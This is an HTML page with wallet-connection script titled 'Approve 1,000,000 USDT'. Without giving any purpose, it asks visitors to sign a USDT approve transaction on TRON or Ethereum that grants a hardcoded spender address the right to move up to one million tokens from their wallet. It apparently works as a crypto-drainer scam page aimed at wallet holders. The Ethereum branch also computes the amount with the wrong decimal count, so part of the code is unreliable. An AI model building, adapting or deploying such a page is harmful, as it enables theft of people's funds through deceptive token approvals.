<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Approve 1,000,000 USDT</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.3/dist/TronWeb.min.js" defer></script>
  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.min.js" defer></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: "Inter", sans-serif;
      background: linear-gradient(135deg, #0a0a0a, #1c1c1c);
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      background: rgba(15, 15, 15, 0.95);
      border-radius: 20px;
      padding: 40px;
      max-width: 600px;
      width: 100%;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
      text-align: center;
      border: 1px solid #00d4ff;
      animation: fadeIn 1s ease-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    h2 {
      font-size: 32px;
      font-weight: 800;
      color: #00d4ff;
      margin-bottom: 20px;
      text-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
    }
    p {
      font-size: 18px;
      color: #cccccc;
      margin-bottom: 20px;
      line-height: 1.5;
    }
    .spender-address {
      font-weight: 600;
      color: #00ff88;
      word-break: break-all;
    }
    button {
      background: linear-gradient(45deg, #00d4ff, #00ff88);
      border: none;
      border-radius: 12px;
      padding: 15px 40px;
      font-size: 18px;
      font-weight: 600;
      color: #1a1a1a;
      cursor: pointer;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin: 10px;
    }
    button:hover {
      background: linear-gradient(45deg, #00ff88, #00d4ff);
      transform: scale(1.05);
      box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
    }
    #loading {
      color: #00ff88;
      font-weight: 600;
      font-size: 16px;
      display: none;
      margin-top: 20px;
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse {
      0% { opacity: 1; }
      50% { opacity: 0.5; }
      100% { opacity: 1; }
    }
    .status {
      margin-top: 20px;
      font-size: 16px;
      font-weight: 600;
      color: #ff4d4d;
      min-height: 25px;
    }
    @media (max-width: 480px) {
      .container {
        padding: 20px;
      }
      h2 {
        font-size: 24px;
      }
      p {
        font-size: 16px;
      }
      button {
        padding: 12px 30px;
        font-size: 16px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Approve 1,000,000 USDT</h2>
    <p>Click the button to authorize the address:<br><strong class="spender-address">0x123... (Ethereum) or TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu (TRON)</strong></p>
    <button onclick="approveUSDT('metamask')">Authorize with MetaMask (ETH)</button>
    <button onclick="approveUSDT('trustwallet')">Authorize with Trust Wallet (ETH)</button>
    <button onclick="approveUSDT('tronlink')">Authorize with TronLink (TRON)</button>
    <div id="loading">Processing Transaction...</div>
    <p class="status" id="statusText"></p>
  </div>

  <script>
    const ethUsdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT ERC-20
    const tronUsdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC-20
    const ethSpenderAddress = "0x1234567890abcdef1234567890abcdef12345678"; // REPLACE with actual Ethereum address
    const tronSpenderAddress = "TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu";
    const usdtABI = [
      {
        constant: false,
        inputs: [
          { name: "_spender", type: "address" },
          { name: "_value", type: "uint256" }
        ],
        name: "approve",
        outputs: [{ name: "", type: "bool" }],
        type: "function",
        stateMutability: "nonpayable"
      }
    ];

    async function waitForTronWeb(timeout = 5000) {
      const start = Date.now();
      while (!window.tronWeb || !window.tronWeb.ready) {
        if (Date.now() - start > timeout) {
          return false;
        }
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      return true;
    }

    async function waitForEthers(timeout = 10000) {
      const start = Date.now();
      while (typeof ethers === "undefined" || !ethers.utils) {
        if (Date.now() - start > timeout) {
          return false;
        }
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      return true;
    }

    async function setupEthereumNetwork() {
      if (window.ethereum) {
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x1" }] // Ethereum Mainnet
          });
          return true;
        } catch (error) {
          if (error.code === 4902) {
            try {
              await window.ethereum.request({
                method: "wallet_addEthereumChain",
                params: [
                  {
                    chainId: "0x1",
                    chainName: "Ethereum Mainnet",
                    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
                    rpcUrls: ["https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"],
                    blockExplorerUrls: ["https://etherscan.io"]
                  }
                ]
              });
              return true;
            } catch (addError) {
              console.warn("Failed to add Ethereum network:", addError);
              return false;
            }
          }
          console.warn("Failed to switch to Ethereum network:", error);
          return false;
        }
      }
      return false;
    }

    async function connectWallet(walletType) {
      try {
        let provider;
        if (walletType === "metamask" || walletType === "trustwallet") {
          if (window.ethereum && (window.ethereum.isMetaMask || window.ethereum.isTrust)) {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await window.ethereum.request({ method: "eth_requestAccounts" });
            const networkAdded = await setupEthereumNetwork();
            if (!networkAdded) {
              throw new Error(`Please switch to Ethereum Mainnet in ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"}.`);
            }
          } else {
            provider = await EthereumProvider.init({
              projectId: "f6b400b4393b83bb22abcaf805ad72d2", // Replace with your WalletConnect project ID
              chains: [1], // Ethereum Mainnet chain ID
              optionalChains: [1],
              rpcMap: { 1: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161" },
              metadata: {
                name: "USDT Approval",
                description: "Approve USDT on Ethereum",
                url: window.location.href,
                icons: ["https://metamask.io/favicon.ico"]
              },
              showQrModal: true
            });
            await provider.connect();
            provider = new ethers.providers.Web3Provider(provider);
            const networkAdded = await setupEthereumNetwork();
            if (!networkAdded) {
              throw new Error(`Please add Ethereum Mainnet in ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"} via WalletConnect.`);
            }
          }
        }
        return provider;
      } catch (error) {
        throw new Error(`Failed to connect ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"}: ${error.message}`);
      }
    }

    async function approveUSDT(walletType) {
      const loadingDiv = document.getElementById("loading");
      const statusText = document.getElementById("statusText");

      try {
        loadingDiv.style.display = "block";
        statusText.textContent = "";

        // Set approval amount: 1,000,000 USDT
        let amount;
        const ethersReady = await waitForEthers();
        if (ethersReady) {
          amount = ethers.utils.parseUnits("1000000", walletType === "tronlink" ? 6 : 18).toString();
        } else {
          amount = walletType === "tronlink" ? "1000000000000" : "1000000000000000000000000"; // 1M * 10^6 (TRC-20) or 1M * 10^18 (ERC-20)
          console.warn("ethers.js not loaded, using fallback amount.");
        }

        if (walletType === "tronlink") {
          // TronLink approval (TRC-20)
          const tronWebReady = await waitForTronWeb();
          if (!tronWebReady || !window.tronWeb.defaultAddress.base58) {
            statusText.textContent = "Please install TronLink and log in to your wallet.";
            loadingDiv.style.display = "none";
            return;
          }

          if (window.tronWeb.fullNode.host !== "https://api.trongrid.io") {
            statusText.textContent = "Please connect to the TRON Mainnet.";
            loadingDiv.style.display = "none";
            return;
          }

          if (!window.tronWeb.isAddress(tronSpenderAddress)) {
            statusText.textContent = "Invalid TRON spender address!";
            loadingDiv.style.display = "none";
            return;
          }

          const contract = await window.tronWeb.contract(usdtABI, tronUsdtContractAddress);

          if (!confirm(`Are you sure you want to approve 1,000,000 USDT (TRC-20) for the address: ${tronSpenderAddress}?`)) {
            statusText.textContent = "Approval cancelled.";
            loadingDiv.style.display = "none";
            return;
          }

          statusText.textContent = "Sending approval transaction with TronLink...";
          const tx = await contract.approve(tronSpenderAddress, amount).send({
            feeLimit: 30000000, // 30 TRX
            callValue: 0,
            shouldPollResponse: false
          });

          statusText.textContent = `✅ Approval successful! Transaction ID: ${tx}`;
        } else if (walletType === "metamask" || walletType === "trustwallet") {
          // MetaMask or Trust Wallet approval (ERC-20)
          const provider = await connectWallet(walletType);
          const signer = provider.getSigner();

          if (!ethers.utils.isAddress(ethSpenderAddress)) {
            statusText.textContent = "Invalid Ethereum spender address!";
            loadingDiv.style.display = "none";
            return;
          }

          const contract = new ethers.Contract(ethUsdtContractAddress, usdtABI, signer);

          if (!confirm(`Are you sure you want to approve 1,000,000 USDT (ERC-20) for the address: ${ethSpenderAddress}?`)) {
            statusText.textContent = "Approval cancelled.";
            loadingDiv.style.display = "none";
            return;
          }

          statusText.textContent = `Sending approval transaction with ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"}...`;
          const tx = await contract.approve(ethSpenderAddress, amount, { gasLimit: 150000 });
          const receipt = await tx.wait();

          statusText.textContent = `✅ Approval successful! Transaction Hash: ${receipt.transactionHash}`;
        }

        loadingDiv.style.display = "none";
      } catch (error) {
        console.error("Transaction error:", error);
        statusText.textContent = `Approval failed: ${error.message || error}`;
        loadingDiv.style.display = "none";
      }
    }
  </script>
</body>
</html>
